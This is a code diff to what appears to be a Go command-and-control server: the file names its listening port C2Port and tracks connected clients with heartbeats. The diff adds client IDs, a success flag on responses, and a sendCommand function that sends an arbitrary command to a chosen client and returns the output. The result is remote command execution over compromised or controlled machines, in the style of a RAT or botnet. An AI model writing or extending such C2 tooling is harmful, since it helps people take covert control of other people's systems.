@@ -14,6 +14,7 @@ type Client struct {
 	ClientBasicInfo
 	Conn     net.Conn
 	IsOnline bool
+	ClientID int
 }
 
 type ClientBasicInfo struct {
@@ -27,16 +28,19 @@ type ClientBasicInfo struct {
 
 type Instructions struct {
 	IsHeartbeat bool
+	IsCommand   bool
 	Message     string
 }
 
 type Response struct {
-	Message string
+	Successful bool
+	Message    string
 }
 
 var (
 	C2Port     string = "1302"
 	clientList []Client
+	clientIDs  int = 0
 )
 
 func (c Client) Instruct(i Instructions) error {
@@ -83,6 +87,21 @@ func handleConn(conn net.Conn) {
 	go Heartbeat(ID)
 }
 
+func sendCommand(ID int, command string) (Output string, err error) {
+	inst := Instructions{
+		IsCommand: true,
+		Message:   command,
+	}
+	clientList[ID].Instruct(inst)
+	resp, err := ServerMessageReceiver(clientList[ID].Conn)
+	if err != nil || resp.Successful != true {
+		fmt.Println("Something went wrong")
+		return "", err
+	}
+	fmt.Println(resp.Message)
+	return resp.Message, nil
+}
+
 func Heartbeat(ID int) {
 	for {
 		inst := Instructions{
@@ -102,6 +121,16 @@ func Heartbeat(ID int) {
 
 		time.Sleep(time.Second * 5)
 	}
+}
+
+func returnClient(ID int) (Client, error) {
+	for _, v := range clientList {
+		if v.ClientID == ID {
+			return v, nil
+		}
+	}
+	err := fmt.Errorf("Client not found")
+	return Client{}, err
 }
 
 func ServerMessageReceiver(conn net.Conn) (Response, error) {
@@ -140,6 +169,8 @@ func getClient(conn net.Conn) (int, error) {
 	newC.ClientBasicInfo = basicC
 	newC.Conn = conn
 	newC.IsOnline = true
+	newC.ClientID = clientIDs
+	clientIDs++
 
 	fmt.Printf("\nCLIENT NOT PRESENT, ADDING TO LIST\n\n")
 	clientList = append(clientList, newC)
